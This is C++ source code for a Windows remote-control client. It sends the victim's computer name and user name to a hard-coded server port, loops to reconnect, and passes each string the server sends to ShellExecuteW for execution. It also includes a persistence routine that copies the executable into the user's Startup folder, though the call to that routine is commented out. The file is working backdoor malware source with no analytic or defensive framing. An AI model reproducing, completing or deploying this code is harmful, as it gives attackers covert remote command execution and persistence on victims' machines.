#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <iostream>
#include <shellapi.h>
#include <locale>
#include <codecvt>
#include <filesystem>

using namespace std;
#pragma comment(lib, "ws2_32.lib")
namespace fs = std::filesystem;
#define PORT 6051

std::wstring ConvertCharToWString(const char* str)
{
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring wideString = converter.from_bytes(str);
    return wideString;
}
int startup(int argc, char * argv[])
{
    fs::path sourceFile = argv[0];
    string appdata = getenv("APPDATA");
    fs::path targo = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    auto target = targo / sourceFile.filename(); 
    try
    {
        fs::copy_file(sourceFile, target, fs::copy_options::update_existing);
        return 1;
    }
    catch (std::exception& e)
    {
        // std::cout << e.what();
        return 0;
    }

}
int main(int argc, char * argv[])
{
    // startup(argc, argv);
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serv_addr;
    // guh
    string fu = getenv("COMPUTERNAME");
    string fu2 = getenv("USERNAME");
    char* hello = ";";
    // hello = fu + hello + fu2;

    fu.append(hello);
    fu.append(fu2);
    hello = fu.data();
    char buffer[1024] = { 0 };
    int valread;

    while (1) {
        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            printf("Failed to initialize winsock");
            return -1;
        }

        if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            printf("Socket creation error\n");
            return -1;
        }
        boolean kill = false;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);
        std::cout << hello << "\n";
        // ShellExecute(0, 0, "http://www.google.com", 0, 0 , SW_SHOW );
        serv_addr.sin_addr.s_addr = inet_addr(" ");

        if (connect(clientSocket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            printf("Connection Failed\n");
            closesocket(clientSocket);
            WSACleanup();
            continue; // Retry the loop if connection fails
        }

        send(clientSocket, hello, strlen(hello), 0);
        printf("Hello message sent\n");
        char keepalive = 1;
        // Keep the connection open and wait for data
        while (1) {
            valread = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (valread > 0) {
                // printf("Received: %s\n", buffer);
                std::wstring wideBuffer = ConvertCharToWString(buffer);
                const wchar_t* ffs = wideBuffer.c_str();
                // std::wcout << wideBuffer << std::endl;
                // cout << sizeof(buffer);
                if(((string)buffer).length() > 3) {
                    if(((string)buffer) == "DISC") kill = true;
                    if(kill) break;
                    std::wcout << wideBuffer << std::endl;
                    ShellExecuteW(0, 0, ffs, 0, 0, SW_SHOW);
                }
                memset(buffer, 0, sizeof(buffer));
                send(clientSocket, &keepalive, sizeof(keepalive), 0);
            }
            else if (valread == 0) {
                printf("Server closed the connection\n");
                break;
            }
            else {
                printf("Receiving data failed\n");
                break;
            }
        }

        // Closing the connected socket
        closesocket(clientSocket);
        WSACleanup();
        if(kill) break;
    }

    return 0;
}
